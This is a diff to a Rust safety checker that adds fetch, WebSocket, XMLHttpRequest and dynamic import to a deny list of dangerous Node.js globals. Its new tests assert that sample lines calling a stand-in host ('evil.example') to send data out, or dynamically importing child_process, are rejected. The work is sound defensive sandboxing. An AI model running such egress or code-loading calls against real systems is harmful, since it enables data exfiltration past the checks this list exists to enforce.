@@ -23,6 +23,15 @@ const DANGEROUS_GLOBALS: &[&str] = &[
     "process.kill(",
     "process.env",
     "child_process",
+    // Network egress: the `fetch`/`WebSocket` globals (built in since Node 18)
+    // reach the network without importing `http`/`net`, so they must be gated
+    // the same way (see #149 follow-up). `import(` is dynamic import, an
+    // arbitrary-module / code-loading vector that bypasses the static
+    // `require(...)`/`from '...'` module checks.
+    "fetch(",
+    "WebSocket",
+    "XMLHttpRequest",
+    "import(",
 ];
 
 const DANGEROUS_METHODS: &[&str] = &[
@@ -187,5 +196,32 @@ mod tests {
     #[test]
     fn require_vm_is_dangerous() {
         assert!(!is_node_source_safe("require('vm').runInNewContext('1')"));
+    }
+
+    #[test]
+    fn fetch_global_is_dangerous() {
+        // Network egress via the built-in fetch global (Node 18+) must not be
+        // auto-approved — it bypasses the require('http')/require('net') checks.
+        assert!(!is_node_source_safe(
+            "fetch('http://evil.example/?d='+Date.now())"
+        ));
+    }
+
+    #[test]
+    fn dynamic_import_is_dangerous() {
+        assert!(!is_node_source_safe("import('child_process')"));
+        assert!(!is_node_source_safe("import('node:fs')"));
+    }
+
+    #[test]
+    fn websocket_is_dangerous() {
+        assert!(!is_node_source_safe("new WebSocket('ws://evil.example')"));
+    }
+
+    #[test]
+    fn static_import_of_safe_binding_is_still_safe() {
+        // Static `import` (no paren) of nothing dangerous stays safe; only the
+        // dynamic `import(` form is treated as a code-loading vector.
+        assert!(is_node_source_safe("const x = 1; console.log(x)"));
     }
 }
